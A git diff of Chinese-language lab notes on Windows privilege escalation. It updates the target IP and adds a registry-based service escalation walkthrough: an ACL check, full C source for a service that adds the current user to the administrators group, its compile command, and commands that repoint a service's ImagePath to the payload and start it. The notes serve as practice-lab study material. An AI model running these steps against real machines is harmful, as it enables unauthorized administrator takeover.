@@ -1,10 +1,10 @@
 
 # rdp连接
 user登录
-> rdesktop -u user -p password321 10.10.86.123 -r sound:on -g workarea
+> rdesktop -u user -p password321 10.10.55.2 -r sound:on -g workarea
 
 TCM登录
-> rdesktop -u TCM -p Hacker123 10.10.86.123 -r sound:on -g workarea
+> rdesktop -u TCM -p Hacker123 10.10.55.2 -r sound:on -g workarea
 
 # 1.注册表提权-自动运行（ Registry Escalation - Autorun）
 
@@ -86,3 +86,117 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 
 ```
+
+# 服务提权-注册表（Service Escalation - Registry）
+
+## 前提
+
+使用下面ps命令查看：
+> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+
+满足属于```NT AUTHORITY\INTERACTIVE```的用户拥有```FullContol```的权限
+
+## 思路
+
+如果拥有修改修改服务注册表的权限，那么就可以通过修改这个服务将要执行的二进制文件进行提权。
+
+## 怎么利用?
+
+将```C:\Users\User\Desktop\Tools\Source\windows_service.c```文件拷贝到kail
+
+1. system里面的命令变为：```cmd.exe /k net localgroup administrators user /add```
+```
+#include <windows.h>
+#include <stdio.h>
+
+#define SLEEP_TIME 5000
+
+SERVICE_STATUS ServiceStatus; 
+SERVICE_STATUS_HANDLE hStatus; 
+ 
+void ServiceMain(int argc, char** argv); 
+void ControlHandler(DWORD request); 
+
+//add the payload here
+int Run() 
+{ 
+    system("cmd.exe /k net localgroup administrators user /add");
+    return 0; 
+} 
+
+int main() 
+{ 
+    SERVICE_TABLE_ENTRY ServiceTable[2];
+    ServiceTable[0].lpServiceName = "MyService";
+    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+
+    ServiceTable[1].lpServiceName = NULL;
+    ServiceTable[1].lpServiceProc = NULL;
+ 
+    StartServiceCtrlDispatcher(ServiceTable);  
+    return 0;
+}
+
+void ServiceMain(int argc, char** argv) 
+{ 
+    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
+    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
+    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    ServiceStatus.dwWin32ExitCode      = 0; 
+    ServiceStatus.dwServiceSpecificExitCode = 0; 
+    ServiceStatus.dwCheckPoint         = 0; 
+    ServiceStatus.dwWaitHint           = 0; 
+ 
+    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
+    Run(); 
+    
+    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
+    SetServiceStatus (hStatus, &ServiceStatus);
+ 
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+    {
+		Sleep(SLEEP_TIME);
+    }
+    return; 
+}
+
+void ControlHandler(DWORD request) 
+{ 
+    switch(request) 
+    { 
+        case SERVICE_CONTROL_STOP: 
+			ServiceStatus.dwWin32ExitCode = 0; 
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+            SetServiceStatus (hStatus, &ServiceStatus);
+            return; 
+ 
+        case SERVICE_CONTROL_SHUTDOWN: 
+            ServiceStatus.dwWin32ExitCode = 0; 
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+            SetServiceStatus (hStatus, &ServiceStatus);
+            return; 
+        
+        default:
+            break;
+    } 
+    SetServiceStatus (hStatus,  &ServiceStatus);
+    return; 
+} 
+
+
+
+```
+
+2. 编译文件
+> x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
+
+3. 把x.exe文件传回靶机。放到```C:\Temp```下面
+
+4. 命令行输入：
+>  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+
+5. 开启服务：
+> sc start regsvc
+
+现在查看admin用户组，就可以看到本账户已经被添加到administrators组：
+> net localgroup administrators
